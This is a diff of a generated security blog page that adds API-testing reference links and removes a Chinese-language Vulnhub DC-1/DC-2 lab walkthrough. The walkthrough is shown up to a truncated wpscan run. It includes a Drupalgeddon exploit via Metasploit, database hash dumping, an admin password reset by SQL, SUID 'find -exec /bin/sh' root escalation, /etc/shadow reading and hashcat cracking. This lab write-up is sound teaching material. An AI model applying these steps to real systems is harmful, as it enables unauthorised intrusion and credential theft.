+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-api-security/">OWASP API Security Top 10 - 2023</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/api-testing">PortSwigger - API Testing</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation">Burp Suite Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html">OWASP - REST Security Cheat Sheet</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="Insecure Deserialization-InsecureDeserialization" class="article article-type-Insecure Deserialization" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -2505,1046 +3456,6 @@
 <p>在最上方的URL後面改ID一直try就可以嘞(改數字)</p>
 <p>Hi Admin , Welcome to Here<br><img src="https://i.imgur.com/AiIAXSK.png"></p>
 <p><code>flag&#123;IDOR_with_ID&#125;</code></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="dc-vulnhub_DC" class="article article-type-dc" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/vulnhub_DC/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.097Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/vulnhub_DC/">
-        Vulnhub DC
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1</a></p>
-<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip"></a></p>
-<p>第一步先找IP，已知該機器的MAC 00:0C:29:9D:6F:F7</p>
-<p><code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
-<p><img src="/img/DC_Untitled.png" alt="Untitled"></p>
-<p>IP 192.168.147.132</p>
-<p>在來查看該機器是否有開啟的服務跟port</p>
-<p><code>nmap -sV -p- -O -T4 -A 192.168.147.132</code></p>
-<p><img src="/img/DC_Untitled_1.png" alt="Untitled"></p>
-<p>22&#x2F;tcp       open  ssh          OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br>80&#x2F;tcp       open  http        Apache httpd 2.2.22 ((Debian))<br>111&#x2F;tcp     open  rpcbind   2-4 (RPC #100000)<br>39453&#x2F;tcp open  status      1 (RPC #100024)</p>
-<p>查看了一下22port，google搜索下來沒有可利用的漏洞</p>
-<p>接下來直接開啟80的網站查看內容</p>
-<p><img src="/img/DC_Untitled_2.png" alt="Untitled"></p>
-<ul>
-<li>http-generator: Drupal 7 (<a target="_blank" rel="noopener" href="http://drupal.org/">http://drupal.org</a>) 前面有提到</li>
-</ul>
-<p>去查該版本的漏洞後發現一個CVE-2014-3704可以嘗試利用，這樣就可以確定說SQL injection攻擊是成立的</p>
-<p><img src="/img/DC_Untitled_3.png" alt="Untitled"></p>
-<p>也可以用Nmap確認漏洞</p>
-<p>└─# <code>nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd=&quot;uname -a&quot;,http-vuln-cve2014-3704.uri=&quot;/node&quot; 192.168.147.132</code></p>
-<p><img src="/img/DC_Untitled_4.png" alt="Untitled"></p>
-<p>接下來可以使用<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/drupal_drupageddon.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/drupal_drupageddon.md</a></p>
-<p>這msf的模塊去攻擊測試，且攻擊成功</p>
-<p><img src="/img/DC_Untitled_5.png" alt="Untitled"></p>
-<p>flag1 : Every good CMS needs a config file - and so do you.</p>
-<p><img src="/img/DC_Untitled_6.png" alt="Untitled"></p>
-<p>看起來需要個配置文件</p>
-<hr>
-<p>另一種解法</p>
-<p><img src="/img/DC_Untitled_7.png" alt="Untitled"></p>
-<hr>
-<p>在目錄搜索時，切換成shell，方便執行linux命令，到&#x2F;sites&#x2F;default下有個設定檔，看到內容中含flag2訊息</p>
-<p><img src="/img/DC_Untitled_8.png" alt="Untitled"></p>
-<p>為了登錄數據庫，需要使用pty套件切換</p>
-<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)’</code></p>
-<p><code>mysql -u dbuser -p</code> 輸入剛給的密碼登入</p>
-<p><img src="/img/DC_Untitled_9.png" alt="Untitled"></p>
-<p>查看數據庫中存在的databases</p>
-<p><img src="/img/DC_Untitled_10.png" alt="Untitled"></p>
-<p><code>show tables;</code></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_drupaldb          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> actions                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> authmap                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> batch                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_custom                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_node_type             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> block_role                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> blocked_ips                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_block                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_bootstrap             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_field                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_filter                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_form                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_image                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_menu                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_page                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_path                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_update                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_views                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cache_views_data            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comment                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ctools_css_cache            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ctools_object_cache         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_format_locale          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_format_type            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_formats                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_config                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_config_instance       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_body             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_comment_body     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_field_image      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_data_field_tags       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_body         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_comment_body <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_field_image  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> field_revision_field_tags   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> file_managed                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> file_usage                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">filter</span>                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> filter_format               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> flood                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> history                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> image_effects               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> image_styles                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_custom                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_links                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> menu_router                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_access                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_comment_statistics     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_revision               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> node_type                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> queue                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> rdf_mapping                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> registry                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> registry_file               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role_permission             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_dataset              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_index                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_node_links           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> search_total                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> semaphore                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sequences                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sessions                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shortcut_set                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shortcut_set_users          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">system</span>                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_index              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_term_data          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_term_hierarchy     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> taxonomy_vocabulary         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> url_alias                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users_roles                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> variable                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> views_display               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> views_view                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> watchdog                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到users的tables，查看後找到admin</p>
-<p><code>SELECT*FROM users;</code></p>
-<p><img src="/img/DC_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li>admin $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</li>
-<li>Fred $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</li>
-</ul>
-<p>從這<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5031662/what-is-drupals-default-password-encryption-method">https://stackoverflow.com/questions/5031662/what-is-drupals-default-password-encryption-method</a> 網站知道drupals他密碼的加密方式是使用hash</p>
-<p><img src="/img/DC_Untitled_12.png" alt="Untitled"></p>
-<p>也許可以用hashcat嘗試，不過需要先下載rockyou的文件爆破</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a></p>
-<p>把剛剛admin密碼丟到txt中</p>
-<p><img src="/img/DC_Untitled_13.png" alt="Untitled"></p>
-<p><code>hashcat -m 7900 hash.txt rockyou.txt</code></p>
-<p>admin</p>
-<p><img src="/img/DC_Untitled_14.png" alt="Untitled"></p>
-<p>發現用hashcat似乎爆破不出東西，也許可以嘗試更改admin passwd </p>
-<p>需要到官網看<a target="_blank" rel="noopener" href="https://www.drupal.org/node/1023428">https://www.drupal.org/node/1023428</a>有寫到如何重製管理員密碼</p>
-<p><img src="/img/DC_Untitled_15.png" alt="Untitled"></p>
-<p>一定要在根目錄運行這命令，不然php會報錯</p>
-<p><img src="/img/DC_Untitled_16.png" alt="Untitled"></p>
-<p>更新管理員密碼</p>
-<p><code>UPDATE users SET pass=&#39;$S$DDoWc38rXBcchn0CbMo1r3KqZYoSb3UF5H95f4BO6JkTcpM0ySch&#39; WHERE uid =1</code></p>
-<p><img src="/img/DC_Untitled_17.png" alt="Untitled"></p>
-<p>admin:123456 </p>
-<p><img src="/img/DC_Untitled_18.png" alt="Untitled"></p>
-<p>到Content頁面下會看到flag3</p>
-<p><img src="/img/DC_Untitled_19.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_20.png" alt="Untitled"></p>
-<p>腳本化本地 Linux 枚舉和權限升級檢查，利用這個確認具有特殊權限的 find 命令。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
-<p><img src="/img/DC_Untitled_21.png" alt="Untitled"></p>
-<p>SETUID 和 SETGID 是 Unix 訪問權限標誌，允許用戶分別以可執行文件所有者或組的權限運行可執行文件，並更改目錄中的行為。它們通常用於允許計算機系統上的用戶以臨時提升的權限運行程序，以執行特定任務。</p>
-<p>在這種情況下，我們不必是 root 即可以 root 身份執行命令。</p>
-<p>提示可以使用 -exec 指令來執行 command，可能原因是 <code>Find</code> 工具被設有 <code>SUID</code> 權限。</p>
-<p><code>find / -type f \( -perm 04000 -o -perm -02000 \) -exec ls -lg &#123;&#125; \;</code></p>
-<p><img src="/img/DC_Untitled_22.png" alt="Untitled"></p>
-<p>find &#x2F;: 這是搜索的起始目錄，表示從根目錄開始遞歸搜索。</p>
-<ul>
-<li><code>type f:</code> 這是選項，指定只搜索文件類型。</li>
-<li><code>\( -perm 04000 -o -perm -02000 \)</code>: 這是一個複合條件，使用<strong>圓括號表示 OR 關係</strong>。 -perm 04000 表示搜索具有設置了 SUID（Set User ID）權限位的文件，而 -perm -02000 表示搜索具有設置了 SGID（Set Group ID）權限位的文件。</li>
-<li><code>exec ls -lg &#123;&#125; \;</code>  : 這是 -exec 選項的用法，用於在找到的<strong>每個文件上執行指定的命令</strong>。在這裡，命令是 ls -lg {}，它會顯示文件的詳細信息，包括權限、所有者和組等。</li>
-<li><code>\;</code> 表示命令的結束。</li>
-</ul>
-<p>為了取得 flag4 的帳號權限，這部分有幾個套路。</p>
-<ol>
-<li>讀取 shadow 檢視 flag4 的 hash 並解密</li>
-<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，並直接瀏覽 flag</li>
-<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，再透過 ssh 匯入 authorized_keys 並透過 ssh 進行登入。</li>
-<li>透過 find -exec 執行 &#x2F;bin&#x2F;sh 獲取 root 權限，直接修改 flag4 使用者的密碼後，再透過 SSH 進行登入。</li>
-</ol>
-<ul>
-<li><p>可以直接選擇<code>find -exec /bin/sh \;</code>直接取得root權限</p>
-</li>
-<li><p><code>find / -name passwd -exec cat &#123;&#125; \;</code></p>
-</li>
-</ul>
-<p><img src="/img/DC_Untitled_23.png" alt="Untitled"></p>
-<ul>
-<li>find &#x2F; -name shadow -exec cat {} ;</li>
-</ul>
-<p><img src="/img/DC_Untitled_24.png" alt="Untitled"></p>
-<p><code>flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</code></p>
-<p>這是SHA-512 crypt 用hashcat爆破試試 </p>
-<p><code>hashcat -a 0 -m 1800 flag4.txt /usr/share/wordlists/rockyou.txt</code></p>
-<p><img src="/img/DC_Untitled_25.png" alt="Untitled"></p>
-<ul>
-<li>$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY&#x2F;eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:<code>orange</code></li>
-</ul>
-<p>知道flag4密碼後就去ssh登入</p>
-<p><img src="/img/DC_Untitled_26.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_27.png" alt="Untitled"></p>
-<p>需要到root去訪問</p>
-<p>用find嘗試提權<code>find . -exec &#39;/bin/sh&#39; \;</code></p>
-<p><img src="/img/DC_Untitled_28.png" alt="Untitled"></p>
-<hr>
-<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2</a></p>
-<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-2.zip"></a></p>
-<p>一樣先找機器的IP</p>
-<p><code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
-<p><img src="/img/DC_Untitled_29.png" alt="Untitled"></p>
-<p>IP : <code>192.168.147.133</code></p>
-<p><code>nmap -sV -p- -O -T4 192.168.147.133</code></p>
-<p><img src="/img/DC_Untitled_30.png" alt="Untitled"></p>
-<p>因為預設到80 port會直接變dc-2解析，所以要更改&#x2F;etc&#x2F;hosts網頁才正常顯示</p>
-<p><img src="/img/DC_Untitled_31.png" alt="Untitled"></p>
-<p>查看到使用的服務 </p>
-<p><img src="/img/DC_Untitled_32.png" alt="Untitled"></p>
-<p><img src="/img/DC_Untitled_33.png" alt="Untitled"></p>
-<p>往下看有個flag</p>
-<p><img src="/img/DC_Untitled_34.png" alt="Untitled"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log <span class="keyword">in</span> <span class="keyword">as</span> <span class="keyword">one</span> <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br></pre></td></tr></table></figure>
-
-<p>也許是跟wordpress有關，提示說到cewl可以查一下這啥</p>
-<p>CeWL</p>
-<p>是一個密碼字典生成器，用爬蟲方式將網站出現的單字列出來並可輸出成檔案供其他工具如</p>
-<p>john來當密碼檔使用，簡單的用法如下</p>
-<ul>
-<li>-d 指定深度，預設為2</li>
-<li>-m 可以限制單字的最小長度，所以這邊長度至少要到8才會被列出</li>
-<li>-w 是將單字輸出至指定檔案</li>
-<li>-e 是指定爬蟲過程也處理email，搭配</li>
-<li>–email_file 將結果輸出到檔案</li>
-</ul>
-<p>最後指定一個目標網站來進行蒐集</p>
-<p><code>cewl [dc-2](http://dc-2/index.php) -w dict.txt</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sit</span><br><span class="line">amet</span><br><span class="line">nec</span><br><span class="line">quis</span><br><span class="line">vel</span><br><span class="line">orci</span><br><span class="line">site</span><br><span class="line">non</span><br><span class="line">sed</span><br><span class="line">vitae</span><br><span class="line">luctus</span><br><span class="line">sem</span><br><span class="line">Sed</span><br><span class="line">leo</span><br><span class="line">ante</span><br><span class="line">content</span><br><span class="line">nisi</span><br><span class="line">Donec</span><br><span class="line">turpis</span><br><span class="line">Aenean</span><br><span class="line">wrap</span><br><span class="line">tincidunt</span><br><span class="line">finibus</span><br><span class="line">dictum</span><br><span class="line">egestas</span><br><span class="line">volutpat</span><br><span class="line">justo</span><br><span class="line">odio</span><br><span class="line">eget</span><br><span class="line">Vestibulum</span><br><span class="line">ipsum</span><br><span class="line">neque</span><br><span class="line">erat</span><br><span class="line">vestibulum</span><br><span class="line">interdum</span><br><span class="line">quam</span><br><span class="line">sodales</span><br><span class="line">nulla</span><br><span class="line">suscipit</span><br><span class="line">arcu</span><br><span class="line">urna</span><br><span class="line">dui</span><br><span class="line">faucibus</span><br><span class="line">sapien</span><br><span class="line">blandit</span><br><span class="line">nibh</span><br><span class="line">tellus</span><br><span class="line">auctor</span><br><span class="line">nisl</span><br><span class="line">sagittis</span><br><span class="line">Suspendisse</span><br><span class="line">laoreet</span><br><span class="line">fermentum</span><br><span class="line">Our</span><br><span class="line">metus</span><br><span class="line">eros</span><br><span class="line">cursus</span><br><span class="line">dignissim</span><br><span class="line">Pellentesque</span><br><span class="line">tortor</span><br><span class="line">lacus</span><br><span class="line">consectetur</span><br><span class="line">convallis</span><br><span class="line">velit</span><br><span class="line">malesuada</span><br><span class="line">Proin</span><br><span class="line">rhoncus</span><br><span class="line">mauris</span><br><span class="line">placerat</span><br><span class="line">commodo</span><br><span class="line">enim</span><br><span class="line">dolor</span><br><span class="line">augue</span><br><span class="line">purus</span><br><span class="line">maximus</span><br><span class="line">posuere</span><br><span class="line">iaculis</span><br><span class="line">molestie</span><br><span class="line">WordPress</span><br><span class="line">Integer</span><br><span class="line">felis</span><br><span class="line">lobortis</span><br><span class="line">condimentum</span><br><span class="line">Nullam</span><br><span class="line">risus</span><br><span class="line">nunc</span><br><span class="line">porttitor</span><br><span class="line">lacinia</span><br><span class="line">imperdiet</span><br><span class="line">porta</span><br><span class="line">viverra</span><br><span class="line">Curabitur</span><br><span class="line">hendrerit</span><br><span class="line">dapibus</span><br><span class="line">diam</span><br><span class="line">branding</span><br><span class="line">header</span><br><span class="line">navigation</span><br><span class="line">entry</span><br><span class="line">aliquam</span><br><span class="line">ullamcorper</span><br><span class="line">Nam</span><br><span class="line">varius</span><br><span class="line">feugiat</span><br><span class="line">ultrices</span><br><span class="line">ligula</span><br><span class="line">scelerisque</span><br><span class="line">congue</span><br><span class="line">gravida</span><br><span class="line">Feed</span><br><span class="line">Mauris</span><br><span class="line">vulputate</span><br><span class="line">semper</span><br><span class="line">elit</span><br><span class="line">tristique</span><br><span class="line">Maecenas</span><br><span class="line">lorem</span><br><span class="line">sollicitudin</span><br><span class="line">Cras</span><br><span class="line">bibendum</span><br><span class="line">Praesent</span><br><span class="line">libero</span><br><span class="line">vehicula</span><br><span class="line">euismod</span><br><span class="line">ultricies</span><br><span class="line">ornare</span><br><span class="line">lectus</span><br><span class="line">Flag</span><br><span class="line">rutrum</span><br><span class="line">fringilla</span><br><span class="line">Morbi</span><br><span class="line">Aliquam</span><br><span class="line">Quisque</span><br><span class="line">primis</span><br><span class="line">magna</span><br><span class="line">pulvinar</span><br><span class="line">Phasellus</span><br><span class="line">tempus</span><br><span class="line">eleifend</span><br><span class="line">elementum</span><br><span class="line">another</span><br><span class="line">What</span><br><span class="line">People</span><br><span class="line">Products</span><br><span class="line">est</span><br><span class="line">accumsan</span><br><span class="line">venenatis</span><br><span class="line">Etiam</span><br><span class="line">pharetra</span><br><span class="line">Fusce</span><br><span class="line">efficitur</span><br><span class="line">Just</span><br><span class="line">Welcome</span><br><span class="line">Nunc</span><br><span class="line">massa</span><br><span class="line">pellentesque</span><br><span class="line">Duis</span><br><span class="line">Nulla</span><br><span class="line">cubilia</span><br><span class="line">Curae</span><br><span class="line">Vivamus</span><br><span class="line">fames</span><br><span class="line">facilisis</span><br><span class="line">consequat</span><br><span class="line">Skip</span><br><span class="line">text</span><br><span class="line">custom</span><br><span class="line">Menu</span><br><span class="line">top</span><br><span class="line">masthead</span><br><span class="line">pretium</span><br><span class="line">potenti</span><br><span class="line">post</span><br><span class="line">main</span><br><span class="line">primary</span><br><span class="line">Proudly</span><br><span class="line">powered</span><br><span class="line">info</span><br><span class="line">colophon</span><br><span class="line">contain</span><br><span class="line">page</span><br><span class="line">Comments</span><br><span class="line">RSD</span><br><span class="line">mollis</span><br><span class="line">mattis</span><br><span class="line">habitant</span><br><span class="line">morbi</span><br><span class="line">senectus</span><br><span class="line">netus</span><br><span class="line">aliquet</span><br><span class="line">tempor</span><br><span class="line">you</span><br><span class="line">Interdum</span><br><span class="line">just</span><br><span class="line">can</span><br><span class="line">Scroll</span><br><span class="line">down</span><br><span class="line">Lorem</span><br><span class="line">adipiscing</span><br><span class="line">panel</span><br><span class="line">facilisi</span><br><span class="line">Orci</span><br><span class="line">natoque</span><br><span class="line">penatibus</span><br><span class="line">magnis</span><br><span class="line">dis</span><br><span class="line">parturient</span><br><span class="line">montes</span><br><span class="line">nascetur</span><br><span class="line">ridiculus</span><br><span class="line">mus</span><br><span class="line">Your</span><br><span class="line">usual</span><br><span class="line">wordlists</span><br><span class="line">probably</span><br><span class="line">won</span><br><span class="line">work</span><br><span class="line">instead</span><br><span class="line">maybe</span><br><span class="line">need</span><br><span class="line">cewl</span><br><span class="line">More</span><br><span class="line">passwords</span><br><span class="line">always</span><br><span class="line">better</span><br><span class="line">but</span><br><span class="line">sometimes</span><br><span class="line">win</span><br><span class="line">them</span><br><span class="line">all</span><br><span class="line">Log</span><br><span class="line">one</span><br><span class="line">see</span><br><span class="line">the</span><br><span class="line">next</span><br><span class="line">flag</span><br><span class="line">find</span><br><span class="line">log</span><br></pre></td></tr></table></figure>
-
-<p>再來可以用wpscan掃網站，因為他是wordpress的</p>
-<p><code>wpscan --url dc-2 --enumerate u</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span 